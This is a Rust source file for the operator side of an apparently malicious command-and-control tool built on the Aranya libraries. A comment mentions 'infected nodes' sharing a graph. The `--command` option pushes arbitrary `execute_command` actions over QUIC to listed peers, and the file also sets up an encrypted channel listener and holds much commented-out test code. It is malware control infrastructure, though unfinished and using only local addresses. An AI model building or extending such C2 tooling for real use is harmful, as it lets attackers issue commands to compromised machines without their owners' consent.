mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    io::{Write, Read},
    net::{IpAddr, Ipv4Addr, SocketAddr, TcpListener},
    path::Path,
    fs,
    str::FromStr,
    sync::Arc,
    time::Duration
};

use aranya_crypto::{CmdId, DeviceId, EncryptionKey, EncryptionPublicKey, IdentityKey, IdentityVerifyingKey, Rng, afc::{UniChannel, UniOpenKey, UniSealKey, UniSecrets}, default::{DefaultCipherSuite, DefaultEngine}, id::Id, policy::LabelId};
use aranya_fast_channels::{AranyaState, Directed, shm::{Flag, Mode, ReadState, WriteState}};
use aranya_policy_vm::{Text, text};
use aranya_runtime::{Sink, VmEffect, vm_action};
use clap::Parser;
use tokio::sync::Mutex;

use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client}, common::{C2Client, PrivateKeyBundle}};

struct OperatorSink {}

#[derive(Parser)]
struct CommandArguments {
    #[arg(long)]
    new_graph: bool,

    // TODO: Is this even possible ?
    // #[arg(long)]
    // list_commands: bool,

    #[arg(long)]
    start_afc: bool,

    #[arg(long)]
    config_dir: String,

    #[arg(long)]
    command: Option<String>,

    #[arg(help = "Peer Addresses e.g. 127.0.0.1:4445")]
    args: Vec<String>
}

impl Sink<VmEffect> for OperatorSink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, _effect: VmEffect) {
        // NOTE: No operation
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

async fn afc_listener(
    mut engine: DefaultEngine<Rng, DefaultCipherSuite>,
    peer_ident: DeviceId,
    peer_enc: EncryptionPublicKey::<DefaultCipherSuite>,
    keys: PrivateKeyBundle
) {
    let channel = UniChannel {
        parent_cmd_id: CmdId::default(),
        our_sk: &keys.enc_key,
        their_pk: &keys.enc_key.public().unwrap(),
        seal_id: Id::default(),
        open_id: keys.ident_key.id().unwrap(),
        label_id: LabelId::default()
    };

    let writestate: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
        aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
        Flag::Create, Mode::ReadWrite, 42, Rng
    ) {
        Ok(v) => v,
        Err(_) => {
            // Already exists
            WriteState::open(
                aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
                Flag::OpenOnly, Mode::ReadWrite, 42, Rng
            ).unwrap()
        }
    };

    let secrets = UniSecrets::new(&mut engine, &channel).unwrap();

    let openchannel = writestate.add(Directed::OpenOnly {
        open: UniOpenKey::from_peer_encap(&channel, secrets.peer).unwrap().into_raw_key()
    }, channel.label_id, keys.ident_key.id().unwrap()).unwrap();

    let readstate = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
        ReadState::open(
            aranya_fast_channels::shm::Path::from_bytes(b"/afc1\x00").unwrap(),
            Flag::OpenOnly, Mode::ReadWrite, 42
        ).unwrap()
    );

    let listener = TcpListener::bind("127.0.0.1:4446").unwrap();

    for stream in listener.incoming() {
        let mut buffer = [0; 1024];

        match stream.unwrap().read(&mut buffer) {
            Ok(n) => {
                println!("{n}");
                println!("Data: {:?}", &buffer[..n]);

                // TODO: lol buffer is too big wth
                let mut dest = vec!(0u8; n - aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
                let mut ctx = readstate.setup_open_ctx(openchannel).unwrap();
                readstate.open(&mut ctx, &mut dest, &buffer[..n]).unwrap();

                print!("{:?}\n", dest);
            }
            Err(_) => {}
        }

        // if let Ok(Some(req)) = stream.unwrap().receive().await {
        //     println!("{:?}", req);
        // }
    }
}

#[tokio::main]
async fn main() {
    // Enable logging to terminal
    tracing_subscriber::fmt::init();

    let args = CommandArguments::parse();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    // let rt = tokio::runtime::Builder::new_multi_thread()
    //     .thread_stack_size(100 * 1024 * 1024)
    //     .enable_all()
    //     .build()
    //     .unwrap();

    let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(127, 0, 0, 3)), 4445);

    let dir = Path::new(&args.config_dir);

    let _ = fs::create_dir(&dir);
    // TODO: {} required here or no ?
    let mut sink = OperatorSink {};
    let mut aranya = C2Client::new(dir);
    // let keys = aranya.create_new_keys(dir);
    
    let keys = match args.new_graph {
        true => {
            aranya.new_engine();
            aranya.create_new_keys()
        },
        false => {
            aranya.load_keys()
        }
    };

    let deviceid = keys.ident_key.id().unwrap();
    let policy = aranya.create_policy(config::POLICY, deviceid).expect("Failed to create policy");
    let mut clientstate = aranya.init_aranya(policy);

    if args.new_graph {
        let graph = match aranya.create_graph(&mut clientstate, &mut sink, &keys) {
            Ok(v) => v,
            Err(_) => return
        };

        // TODO: Temporary debug code for infected nodes to quickly
        //   connect up to the same graph ID
        fs::write("src/graph.txt", graph.as_array());
    }

        // TODO: AFC test
        // let identity = IdentityKey::<DefaultCipherSuite>::new(&mut engine);
        // let encryption = EncryptionKey::<DefaultCipherSuite>::new(&mut engine);

        let peer_ident = IdentityKey::<DefaultCipherSuite>::new(&mut aranya.engine);
        let peer_enc = EncryptionKey::<DefaultCipherSuite>::new(&mut aranya.engine);

        let ch1 = UniChannel {
            parent_cmd_id: CmdId::default(),
            our_sk: &keys.enc_key,
            their_pk: &peer_enc.public().unwrap(), // TODO: 
            seal_id: keys.ident_key.id().unwrap(),
            open_id: peer_ident.id().unwrap(), // TODO: Remote
            label_id: LabelId::default()
        };

        let ch2 = UniChannel {
            parent_cmd_id: CmdId::default(),
            our_sk: &peer_enc,
            their_pk: &keys.enc_key.public().unwrap(), // TODO: 
            seal_id: keys.ident_key.id().unwrap(),
            open_id: peer_ident.id().unwrap(), // TODO: Remote
            label_id: LabelId::default()
        };


        // use aranya_fast_channels::{
        //     AfcState, AranyaState, Channel, Client, Directed, Error, LocalChannelId,
        //     crypto::Aes256Gcm,
        //     shm::{Flag, Mode, ReadState, WriteState},
        // };

        // // let afcdir = dir.join("");

        // // // TODO: Fix OpenOnly here
        // // let nulpath = format!("{}\0", dir.join("afc").to_str().unwrap());
        // // println!("{nulpath}");
        // let write_state1: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
        //     aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
        //     Flag::Create, Mode::ReadWrite, 42, Rng
        // ) {
        //     Ok(v) => v,
        //     Err(_) => {
        //         // Already exists
        //         WriteState::open(
        //             aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
        //             Flag::OpenOnly, Mode::ReadWrite, 42, Rng
        //         ).unwrap()
        //     }
        // };

        // let read_state1 = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
        //     ReadState::open(
        //         aranya_fast_channels::shm::Path::from_bytes(b"/afc\0").unwrap(),
        //         Flag::OpenOnly, Mode::ReadWrite, 42
        //     ).unwrap()
        // );

        // let secrets1 = UniSecrets::new(&mut aranya.engine, &ch1).unwrap();

        // let channel1 = write_state1.add(Directed::SealOnly {
        //     seal: UniSealKey::from_author_secret(&ch1, secrets1.author).unwrap().into_raw_key()
        // }, ch1.label_id, keys.ident_key.id().unwrap()).unwrap();

        // let ciphertext = {
        //     let mut dest = vec!(0u8; "Hello".len() + Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
        //     let mut ctx = read_state1.setup_seal_ctx(channel1).unwrap();
        //     read_state1.seal(&mut ctx, &mut dest, "Hello".as_bytes()).unwrap();
        //     dest
        // };

        // print!("{:?}\n", ciphertext);


        // let write_state2: WriteState<DefaultCipherSuite, Rng> = match WriteState::open(
        //     aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
        //     Flag::Create, Mode::ReadWrite, 42, Rng
        // ) {
        //     Ok(v) => v,
        //     Err(_) => {
        //         // Already exists
        //         WriteState::open(
        //             aranya_fast_channels::shm::Path::from_bytes(b"/afc1\0").unwrap(),
        //             Flag::OpenOnly, Mode::ReadWrite, 42, Rng
        //         ).unwrap()
        //     }
        // };
    
        // let channel2 = write_state2.add(Directed::OpenOnly {
        //     open: UniOpenKey::from_peer_encap(&ch2, secrets1.peer).unwrap().into_raw_key()
        // }, ch1.label_id, keys.ident_key.id().unwrap()).unwrap();

        // let read_state2 = aranya_fast_channels::Client::<ReadState<DefaultCipherSuite>>::new(
        //     ReadState::open(
        //         aranya_fast_channels::shm::Path::from_bytes(b"/afc1\x00").unwrap(),
        //         Flag::OpenOnly, Mode::ReadWrite, 42
        //     ).unwrap()
        // );

        // {
        //     let mut dest = vec!(0u8; ciphertext.len() - Client::<ReadState<DefaultCipherSuite>>::OVERHEAD);
        //     let mut ctx = read_state2.setup_open_ctx(channel2).unwrap();
        //     read_state2.open(&mut ctx, &mut dest, &ciphertext).unwrap();

        //     print!("{:?}\n", dest);
        // }
        // TODO: End AFC test

    if let Some(command) = args.command {
        let txt = Text::from_str(&command).unwrap();
        clientstate.action(
            aranya.get_graph(),
            &mut sink,
            vm_action!(execute_command(txt))
        );

        let quic = {
            let mut syncbind = bind.clone();
            syncbind.set_port(4446);
            Arc::new(new_quic_client(syncbind))
        };

        let syncer = Arc::new(Mutex::new(C2Syncer::new(clientstate, sink)));

        for ipstr in args.args {
            let socket: SocketAddr = ipstr.parse().expect("Invalid IP format");
            c2push(socket, Arc::clone(&quic), Arc::clone(&syncer), aranya.get_graph()).await;
            println!("SYNCED");
        }
        
        // TODO: This sleep is very important becasue without it, the
        //   program will end and the data won't be transferred to
        //   some of the peers, if any at all.
        tokio::time::sleep(Duration::from_millis(1000)).await;
    }

    if args.start_afc {
        // TODO: Random keys
        let peer_ident = IdentityKey::<DefaultCipherSuite>::new(
            &mut aranya.engine
        ).id().unwrap();

        let peer_enc = EncryptionKey::<DefaultCipherSuite>::new(
            &mut aranya.engine
        ).public().unwrap();

        tokio::spawn(afc_listener(aranya.engine.clone(), peer_ident, peer_enc, keys));
        tokio::time::sleep(Duration::from_millis(1000)).await;
        aranya.setup_fast_channel();
    }

    // let graph = aranya.create_graph(&dir, &mut cs, &mut sink, &keys);

    // let mut file = std::fs::File::create(dir.join(Path::new("config.yaml"))).expect("Cannot open file");
    // let mut contents = String::new();
    // file.read_to_string(&mut contents);

    // let s = serde_yaml::from_str::<std::collections::BTreeMap<String, String>>(&contents).expect("YAML deserialisation failure");
    // println!("{:?}", s.get("hi"));

    // println!("{:?}", graph);

    // rt.block_on(async move {
    //     // if args.new_graph {
    //     //     let graph = match aranya.create_graph().await {
    //     //         Ok(v) => v,
    //     //         Err(_) => {
    //     //             print!("Failed to create Aranya graph...");
    //     //             return;
    //     //         }
    //     //     };

    //     //     let mut file = std::fs::File::create("src/graph.txt").unwrap();
    //     //     file.write_all(graph.as_array()).expect("Failed to write to debug graph.txt");
    //     // }

    //     let quica = {
    //         let mut syncbind = bind.clone();
    //         syncbind.set_port(4446);
    //         Arc::new(new_quic_client(syncbind))
    //     };

    //     // TODO: Insane testing environemnt skills
    //     // TODO: End skills

    //     // TODO: AFC Test

    //     // tokio::spawn(async {
    //     //     afc_listener().await;
    //     // });

    //     // TODO: End AFC Test
    // });
}
